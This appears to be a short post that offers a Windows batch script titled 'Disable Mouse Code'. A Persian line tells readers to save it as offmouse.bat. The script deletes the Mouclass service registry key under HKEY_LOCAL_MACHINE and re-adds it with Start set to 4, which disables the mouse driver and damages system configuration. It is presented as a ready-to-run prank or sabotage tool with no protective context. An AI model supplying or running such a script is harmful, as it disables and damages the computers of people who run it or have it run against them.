Disable Mouse Code 

کد پایین رو در نوت پد با فرمت بات زخیره کنید 
               
                  offmouse.Bat
:
------------------------------------------------------------------
rem RoMRX
rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem TM Cyber Screen

-------------------------------------------------------------------

Romrx
